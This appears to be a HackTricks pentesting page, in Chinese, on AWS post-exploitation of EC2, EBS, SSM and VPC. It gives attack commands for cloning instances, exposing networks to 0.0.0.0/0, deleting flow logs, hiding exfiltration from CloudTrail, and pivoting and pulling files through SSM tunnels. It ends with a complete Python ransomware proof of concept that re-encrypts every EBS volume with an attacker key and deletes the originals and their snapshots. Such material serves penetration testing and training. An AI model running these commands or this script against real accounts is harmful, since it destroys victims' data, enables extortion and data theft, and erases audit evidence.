# AWS - EC2, EBS, SSM & VPC 后利用

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

更多信息请查看：

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC traffic mirroring **复制 VPC 中 EC2 instances 的入站和出站流量**，无需在实例本身安装任何东西。复制的流量通常会发送到类似网络入侵检测系统 (IDS) 的设备进行分析和监控。\
攻击者可以滥用此功能来捕获所有流量并从中获取敏感信息：

更多信息请查看此页面：

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Copy Running Instance

实例通常包含某种敏感信息。有多种方法可以进入实例（参见 [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)）。不过，另一种检查其内容的方法是 **创建一个 AMI 并从中运行一个新实例（甚至在你自己的账号中）**：
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**快照是卷的备份**，通常包含**敏感信息**，因此检查它们应该会披露这些信息。\
如果你发现一个**没有快照的卷**，你可以：**创建快照**并执行以下操作或直接**将其挂载到该账户内的实例**：

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

使用 `CreateStoreImageTask` 将 EC2 AMI 直接导出到 S3，以获得原始磁盘镜像而无需共享快照。这样可以进行完整的离线取证或数据盗窃，同时保持实例网络设置不变。

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

将 io1/io2 Multi-Attach 卷附加到第二台实例，并以只读方式挂载，以在不使用快照的情况下窃取实时数据。当受害卷在同一 AZ 中已启用 Multi-Attach 时此方法特别有用。

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

创建 EC2 Instance Connect Endpoint，授权入站并注入临时 SSH 密钥，通过受管隧道访问私有实例。无需打开公共端口即可快速实现横向移动。

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

将受害者 ENI 的次要私有 IP 移到攻击者控制的 ENI，从而冒充按 IP 列入 allowlist 的可信主机。可绕过基于特定地址的内部 ACL 或 SG 规则。

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

将受害实例的 Elastic IP 重新关联到攻击者，以拦截入站流量或发起看起来来自可信公共 IP 的出站连接。

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

如果 security group 的规则引用了一个 customer-managed prefix list，向该列表添加攻击者 CIDR 会在不修改 SG 本身的情况下悄然扩展对所有依赖规则的访问。

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

创建 gateway 或 interface VPC endpoints，从孤立子网恢复出站访问。利用 AWS-managed private links 可以绕过缺失的 IGW/NAT 控制以进行 data exfiltration。

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### `ec2:AuthorizeSecurityGroupIngress`

拥有 ec2:AuthorizeSecurityGroupIngress 权限的攻击者可以向 security groups 添加入站规则（例如允许来自 0.0.0.0/0 的 tcp:80），从而使内部服务暴露到公共 Internet 或其他未授权网络。
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
```
# `ec2:ReplaceNetworkAclEntry`
具有 ec2:ReplaceNetworkAclEntry（或类似）权限的攻击者可以修改子网的 Network ACLs (NACLs)，使其变得非常宽松——例如在关键端口上允许 0.0.0.0/0——从而将整个子网范围暴露给 Internet 或未授权的网络段。与按实例应用的 Security Groups 不同，NACLs 在子网级别应用，因此更改一个受限的 NACL 可能会产生更大的影响范围，使更多主机可被访问。
```bash
aws ec2 replace-network-acl-entry \
--network-acl-id <ACL_ID> \
--rule-number 100 \
--protocol <PROTOCOL> \
--rule-action allow \
--egress <true|false> \
--cidr-block 0.0.0.0/0
```
### `ec2:Delete*`

拥有 ec2:Delete* 和 iam:Remove* 权限的攻击者可以删除关键的基础设施资源和配置 — 例如 key pairs、launch templates/versions、AMIs/snapshots、volumes or attachments、security groups or rules、ENIs/network endpoints、route tables、gateways，或 managed endpoints。 这可能导致立即的服务中断、数据丢失以及取证证据的丢失。

一个例子是删除一个 security group:

aws ec2 delete-security-group \
--group-id <SECURITY_GROUP_ID>

### VPC Flow Logs Cross-Account Exfiltration

将 VPC Flow Logs 指向攻击者控制的 S3 bucket，以在受害账户之外持续收集网络元数据（源/目的地、端口），用于长期侦察。

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

即使你将 EC2 锁定使其无法发出任何流量，它仍然可以 **exfil via DNS**。

- **VPC Flow Logs 不会记录此类流量**。
- 你无法访问 AWS 的 DNS 日志。
- 通过将 "enableDnsSupport" 设置为 false 来禁用此项，命令如下：

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

攻击者可能会调用由其控制的账户的 API 端点。Cloudtrail 会记录这些调用，攻击者将能够在 Cloudtrail 日志中看到 exfiltrate data。

### Open Security Group

你可以通过像下面这样打开端口来获得对网络服务的进一步访问：
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc to ECS

可以运行一个 EC2 实例并将其注册为用于运行 ECS 实例，然后窃取这些 ECS 实例的数据。

更多信息请参见 [**此处**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### Remove VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM 端口转发

Required permissions:

- `ssm:StartSession`

除了命令执行外，SSM 还支持流量隧道（traffic tunneling），可被滥用用于从因 Security Groups 或 NACLs 而无法访问网络的 EC2 实例进行 pivot。
一个常见场景是从 [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) pivot 到私有 EKS 集群。

> 要启动 session，你需要在本机安装 SessionManagerPlugin：https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. 在你的机器上安装 SessionManagerPlugin
2. 使用以下命令登录到 Bastion EC2：
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. 使用 [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment) 脚本获取 Bastion EC2 的 AWS 临时凭证
4. 将凭证以 `[bastion-ec2]` 配置文件的形式传输到你本机的 `$HOME/.aws/credentials` 文件中
5. 以 Bastion EC2 身份登录到 EKS:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. 将 `$HOME/.kube/config` 文件中的 `server` 字段更新为指向 `https://localhost`  
7. 按照如下方式创建 SSM 隧道：
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. 来自 `kubectl` 工具的流量现在通过 Bastion EC2 经由 SSM 隧道转发，您可以在自己的机器上运行以下命令以访问私有 EKS 集群：
```shell
kubectl get pods --insecure-skip-tls-verify
```
注意：如果不设置 `--insecure-skip-tls-verify ` 标志（或 K8s 审计工具中的等效项），SSL 连接将会失败。由于流量通过安全的 AWS SSM 隧道传输，你可以免受任何形式的 MitM 攻击。

最后，该技术并不限于攻击私有 EKS 集群。你可以设置任意域名和端口，以 pivot 至任何其他 AWS 服务或自定义应用。

---

#### 快速 本地 ↔️ 远程 端口转发 (AWS-StartPortForwardingSession)

如果你只需要将 **一个 TCP 端口从 EC2 实例转发到你的本地主机**，可以使用 `AWS-StartPortForwardingSession` SSM 文档（不需要远程主机参数）：
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
该命令在你的工作站（`localPortNumber`）与实例上的选定端口（`portNumber`）之间建立一个双向隧道，**无需打开任何入站 Security-Group 规则**。

Common use cases:

* **File exfiltration**
1. 在实例上启动一个指向你想要 exfiltrate 的目录的简易 HTTP 服务器：

```bash
python3 -m http.server 8000
```

2. 从你的工作站通过 SSM 隧道获取文件：

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **访问内部 Web 应用（例如 Nessus）**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
提示：在 exfiltrating 之前压缩并加密证据，以便 CloudTrail 不记录明文内容：
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### 共享 AMI
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### 在公共和私有 AMIs 中搜索敏感信息

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel 是一个工具，旨在**在公共或私有 Amazon Machine Images (AMIs) 中搜索敏感信息**。它自动化了从目标 AMIs 启动实例、挂载其卷，并扫描潜在的 secrets 或敏感数据的过程。

### 共享 EBS 快照
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

这是一个与 S3 post-exploitation 说明中示范的 Ransomware 演示类似的概念验证 (PoC)。鉴于 KMS 用来加密各类 AWS 服务非常容易，理论上可以将其称为 RMS（Ransomware Management Service）。

首先，从一个 “attacker” AWS 账户中，在 KMS 创建一个 customer managed key。在本例中，我们让 AWS 为我管理密钥数据，但在真实场景中，a malicious actor 会将密钥数据保存在 AWS 控制之外。更改 key policy，允许任何 AWS account Principal 使用该密钥。在这个 key policy 中，账户名为 'AttackSim'，允许全部访问的策略规则名为 'Outside Encryption'
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
密钥策略规则需要启用以下项，以允许使用它来加密 EBS 卷：

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

现在有了可公开访问的 key 可以使用。我们可以使用一个有些 EC2 实例且附带未加密 EBS 卷的 “victim” 账户。这个 “victim” 账户的 EBS 卷是我们要加密的目标，本次攻击是假定已有一个高权限 AWS 账户被入侵。

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

类似于 S3 ransomware 示例。该攻击会使用 snapshots 创建附加 EBS 卷的副本，使用来自 “attacker” 账户的公开可用 key 对新的 EBS 卷进行加密，然后从 EC2 实例上分离并删除原始 EBS 卷，最后删除用于创建新加密 EBS 卷的 snapshots。 ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

这将导致账户中只剩下已加密的 EBS 卷。

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

另外值得注意的是，脚本停止了 EC2 实例以分离并删除原始 EBS 卷。原始未加密卷现在已经消失。

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

接下来，返回到 “attacker” 账户中的 key policy，并从密钥策略中移除 'Outside Encryption' 策略规则。
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
等待新设置的 key policy 传播生效。然后返回 'victim' 账户并尝试挂载其中一个新加密的 EBS 卷。你会发现可以挂载该卷。

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

但是，当你尝试启动附有加密 EBS 卷的 EC2 实例时，它会失败，并且会一直从 'pending' 状态回到 'stopped' 状态，因为已附加的 EBS 卷无法使用该 key 解密，原因是 key policy 不再允许。

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

这是所使用的 python 脚本。它接受用于 'victim' 账户的 AWS creds 和一个可公开获得的用于加密的 AWS ARN 值。该脚本会为目标 AWS 账户中挂载到所有 EC2 实例的 ALL 可用 EBS 卷制作加密副本，然后停止每个 EC2 实例，分离原始 EBS 卷，删除它们，最后删除过程中使用的所有 snapshots。这将使目标 'victim' 账户中只剩下加密的 EBS 卷。ONLY USE THIS SCRIPT IN A TEST ENVIRONMENT, IT IS DESTRUCTIVE AND WILL DELETE ALL THE ORIGINAL EBS VOLUMES。你可以使用所使用的 KMS key 恢复它们，并通过 snapshots 将它们还原到原始状态，但需要提醒你，这归根结底是一个 ransomware PoC。
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## 参考资料

- [Pentest Partners – 如何在 AWS 中使用 SSM 传输文件](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
